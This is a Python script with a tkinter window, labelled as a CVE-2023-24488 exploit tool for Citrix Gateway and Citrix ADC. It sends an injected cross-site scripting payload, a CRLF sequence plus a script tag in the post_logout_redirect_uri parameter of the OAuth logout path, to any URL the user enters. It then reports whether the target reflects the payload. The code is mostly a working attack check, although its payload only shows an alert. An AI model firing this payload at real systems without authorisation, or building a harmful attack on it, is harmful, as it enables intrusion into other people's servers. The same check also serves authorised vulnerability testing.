import requests
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Apachedom():
    root = tkinter.Tk()
    root.title("CVE-2023-24488 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        url = inp

        def check_cve_2023_24488(url):
            path = "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a<script>alert(document.domain)</script>"
            response = requests.get(url + path)

            if ("<script>alert(document.domain)</script>" in response.text and
                "content-type: text/html" in response.headers.get("Content-Type", "").lower() and
                response.status_code == 302):
                return True
            return False

        if check_cve_2023_24488(url):
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, "Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
            #print("Vulnerable to CVE-2023-24488: Citrix Gateway and Citrix ADC - Cross-Site Scripting")
        else:
            #print("Not vulnerable to CVE-2023-24488")
            scroll_y = Scrollbar(root, orient=VERTICAL)
            txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
            scroll_y.pack(side=RIGHT, fill=Y)
            scroll_y.config(command=txtarea.yview)
            txtarea.insert(END, "Not vulnerable to CVE-2023-24488")
            txtarea.pack(fill=BOTH, expand=True)
            txtarea.configure(state ='disabled')
    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
